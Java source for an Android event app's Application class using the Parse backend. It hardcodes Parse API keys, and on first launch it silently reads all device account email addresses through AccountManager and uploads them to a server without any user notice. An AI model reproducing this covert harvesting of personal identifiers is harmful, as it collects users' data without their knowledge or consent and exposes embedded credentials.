package com.dityish.apratim2k16;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Application;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.util.Patterns;

import com.parse.Parse;
import com.parse.ParseACL;
import com.parse.ParseInstallation;
import com.parse.ParseObject;
import com.parse.ParseUser;

import java.util.regex.Pattern;

/**
 * Created by Nitish on 10/22/2015.
 */
public class Oasis2015 extends Application {
    SharedPreferences prefs = null;
    String emailID=" ";
    @Override
    public void onCreate() {
        super.onCreate();

        // Enable Local Datastore.
        Parse.enableLocalDatastore(this);

        // Add your initialization code here
        Parse.initialize(this, "2zBSWSycuQVaAZvvVO1vQmm1zN1zBv6pQfCGMYUP", "Yfl78nSj6bSbgcMBJw3EZUNahTJsTvkBWovSleFU");
        ParseInstallation.getCurrentInstallation().saveInBackground();
        ParseUser.enableAutomaticUser();
        ParseACL defaultACL = new ParseACL();
        // Optionally enable public read access.
        // defaultACL.setPublicReadAccess(true);
        ParseACL.setDefaultACL(defaultACL, true);
            prefs = getSharedPreferences("com.dityish.apratim2k16", MODE_PRIVATE);
        if (prefs.getBoolean("firstrun", true)) {
            // Do first run stuff here then set 'firstrun' as false
            // using the following line to edit/commit prefs
            getAccount();
            sendToServer();
            prefs.edit().putBoolean("firstrun", false).apply();
        }

    }

    public void getAccount()
    {
        Pattern emailPattern = Patterns.EMAIL_ADDRESS;
        AccountManager manager = (AccountManager) getSystemService(ACCOUNT_SERVICE);
        Account[] accounts = manager.getAccounts();
        for (Account account : accounts) {
            if (emailPattern.matcher(account.name).matches()) {
                String possibleEmail = account.name;

                emailID=emailID+possibleEmail+" , ";
            }
        }
    }

    public void sendToServer ()
    {
        final String msg="Failure";
        new AsyncTask<Void, Void, String>() {
            @Override
            protected String doInBackground(Void... params) {
                ParseObject register = new ParseObject("EmailID");
                register.put("EmailId", emailID);
                register.saveInBackground();
                return msg;
            }
        }.execute(null,null,null);
    }

}
